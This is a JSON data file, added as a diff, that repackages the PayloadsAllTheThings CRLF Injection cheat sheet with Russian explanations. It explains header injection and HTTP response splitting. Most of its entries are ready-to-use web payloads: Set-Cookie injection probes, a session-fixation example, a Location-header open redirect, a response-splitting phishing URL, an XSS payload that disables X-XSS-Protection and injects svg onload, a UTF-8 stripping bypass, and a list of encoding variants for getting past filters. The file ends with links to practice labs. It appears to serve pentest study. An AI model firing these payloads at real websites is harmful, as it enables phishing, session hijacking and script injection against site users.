@@ -1,0 +1,116 @@
+{
+  "category": "CRLF Injection",
+  "source": "PayloadsAllTheThings/CRLF Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое CRLF Injection",
+      "language": "text",
+      "tags": ["methodology", "crlf"],
+      "body": "CRLF-инъекция возникает, когда приложение подставляет пользовательский ввод в HTTP-ответ (чаще всего в заголовок) без фильтрации символов CR и LF.\n\nCR  (\\r, ASCII 13) — возврат каретки, переводит курсор в начало строки.\nLF  (\\n, ASCII 10) — перевод строки, переносит курсор на следующую строку.\n\nВ протоколе HTTP последовательность CRLF (\\r\\n) всегда завершает строку заголовка. Внедрив CRLF, атакующий разрывает ответ на две части и контролирует его структуру. Те же символы значимы и в других построчных протоколах (SMTP и т.п.)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "HTTP Response Splitting — суть атаки",
+      "language": "text",
+      "tags": ["methodology", "response-splitting"],
+      "body": "HTTP Response Splitting — разновидность CRLF, когда инъекция CR/LF в заголовок ответа позволяет «расщепить» один ответ на два и полностью управлять телом/заголовками второй части.\n\nК чему ведёт контроль над структурой ответа:\n• XSS — внедрение скрипта в подставленное тело ответа.\n• Отравление кэша (cache poisoning) — заставить кэш сохранить подменённый контент.\n• Манипуляция заголовками — Set-Cookie, Location, X-XSS-Protection и др., чтобы ввести в заблуждение пользователя или систему."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать и как детектить",
+      "language": "text",
+      "tags": ["methodology", "detection", "recon"],
+      "body": "• Цель — любой параметр, чьё значение попадает в заголовок ответа: lang, redirect/url, реферер, имена кук, кастомные X-заголовки.\n• Базовый пробник — внедрить Set-Cookie через CRLF и проверить, появился ли заголовок в ответе:\n    /%0d%0aSet-Cookie:crlf=injection\n• Если фронт/прокси режут \\r\\n — пробуй варианты кодирования (один %0a, двойное URL-кодирование, юникод-обходы — см. раздел «Обход фильтров»).\n• Подтверждение: в сыром ответе появилась новая строка заголовка, которой ты управляешь."
+    },
+    {
+      "subcategory": "Базовые CRLF",
+      "title": "Инъекция Set-Cookie — базовые варианты",
+      "language": "http",
+      "tags": ["crlf", "set-cookie", "header-injection"],
+      "body": "/%0aSet-Cookie:crlf=injection\n/%0dSet-Cookie:crlf=injection\n/%0d%0aSet-Cookie:crlf=injection"
+    },
+    {
+      "subcategory": "Базовые CRLF",
+      "title": "Session Fixation — навязывание своей куки",
+      "language": "http",
+      "tags": ["crlf", "set-cookie", "session-fixation"],
+      "body": "Если ввод вида\n\n    value\\r\\nSet-Cookie: admin=true\n\nподставляется в заголовки без санитизации, обычный ответ\n\n    HTTP/1.1 200 OK\n    Content-Type: text/html\n    Set-Cookie: sessionid=abc123\n\nпревращается в\n\n    HTTP/1.1 200 OK\n    Content-Type: text/html\n    Set-Cookie: sessionid=value\n    Set-Cookie: admin=true\n\nАтакующий навязал жертве собственную куку (фиксация сессии)."
+    },
+    {
+      "subcategory": "Инъекция заголовков",
+      "title": "Открытый редирект через CRLF (Location)",
+      "language": "http",
+      "tags": ["crlf", "open-redirect", "location"],
+      "body": "%0d%0aLocation:%20http://myweb.com"
+    },
+    {
+      "subcategory": "XSS через CRLF",
+      "title": "Фишинг — переписать тело ответа (HTTP Response Splitting)",
+      "language": "http",
+      "tags": ["crlf", "response-splitting", "phishing"],
+      "body": "Самый простой способ эксплуатации CRLF — дописать новое тело страницы (фишинг или произвольный JS).\n\nЗапрашиваемый URL:\n\nhttp://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E\n\nРезультирующий HTTP-ответ:\n\nSet-Cookie:en\nContent-Length: 0\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nLast-Modified: Mon, 27 Oct 2060 14:50:18 GMT\nContent-Length: 34\n\n<html>You have been Phished</html>"
+    },
+    {
+      "subcategory": "XSS через CRLF",
+      "title": "XSS — отключить X-XSS-Protection и внедрить svg",
+      "language": "http",
+      "tags": ["crlf", "xss", "x-xss-protection"],
+      "body": "CRLF-инъекция позволяет добавить заголовок X-XSS-Protection:0 (выключить фильтр), а затем дописать HTML-тег с JavaScript.\n\nЗапрашиваемый URL:\n\nhttp://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e\n\nВ ответе после строки Link: появляется внедрённое:\n\nContent-Length:35\nX-XSS-Protection:0\n\n23\n<svg onload=alert(document.domain)>\n0"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через UTF-8 символы (стрипинг в Firefox)",
+      "language": "text",
+      "tags": ["crlf", "filter-bypass", "utf-8", "encoding"],
+      "body": "По RFC 7230 значения заголовков должны использовать только подмножество US-ASCII. Firefox следовал спецификации и при установке куки ОБРЕЗАЛ символы вне диапазона, а не кодировал их. Поэтому многобайтовый UTF-8 символ, чей последний байт равен 0a/0d/3c/3e, после стрипинга превращался в \\n / \\r / < / >.\n\nНапример, символ 嘊 содержит 0a в хвосте hex-представления (%E5%98%8A) и схлопывается Firefox в \\n. Соответствие символов — в таблице ниже."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "UTF-8 символы → стрипятся в управляющие байты",
+      "language": "table",
+      "tags": ["crlf", "filter-bypass", "utf-8"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["UTF-8 символ", "Hex", "Unicode", "Стрипится в"],
+          "rows": [
+            ["嘊", "%E5%98%8A", "\\u560a", "%0A (\\n)"],
+            ["嘍", "%E5%98%8D", "\\u560d", "%0D (\\r)"],
+            ["嘾", "%E5%98%BE", "\\u563e", "%3E (>)"],
+            ["嘼", "%E5%98%BC", "\\u563c", "%3C (<)"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Полезная нагрузка из UTF-8 символов (svg/onload)",
+      "language": "text",
+      "tags": ["crlf", "filter-bypass", "utf-8", "xss"],
+      "body": "嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Та же нагрузка в URL-кодировке",
+      "language": "text",
+      "tags": ["crlf", "filter-bypass", "utf-8", "xss"],
+      "body": "%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Варианты кодирования CR/LF (для байпаса фильтров)",
+      "language": "http",
+      "tags": ["crlf", "filter-bypass", "encoding", "fuzzing"],
+      "body": "/%%0a0aSet-Cookie:crlf=injection\n/%0aSet-Cookie:crlf=injection\n/%0d%0aSet-Cookie:crlf=injection\n/%0dSet-Cookie:crlf=injection\n/%23%0aSet-Cookie:crlf=injection\n/%23%0d%0aSet-Cookie:crlf=injection\n/%23%0dSet-Cookie:crlf=injection\n/%25%30%61Set-Cookie:crlf=injection\n/%25%30aSet-Cookie:crlf=injection\n/%250aSet-Cookie:crlf=injection\n/%25250aSet-Cookie:crlf=injection\n/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection\n/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection\n/%2F..%0d%0aSet-Cookie:crlf=injection\n/%3f%0d%0aSet-Cookie:crlf=injection\n/%3f%0dSet-Cookie:crlf=injection\n/%u000aSet-Cookie:crlf=injection"
+    },
+    {
+      "subcategory": "Лаборатории",
+      "title": "Практика — лабы по CRLF",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "• PortSwigger — HTTP/2 request splitting via CRLF injection: https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection\n• Root Me — CRLF: https://www.root-me.org/en/Challenges/Web-Server/CRLF"
+    }
+  ]
+}
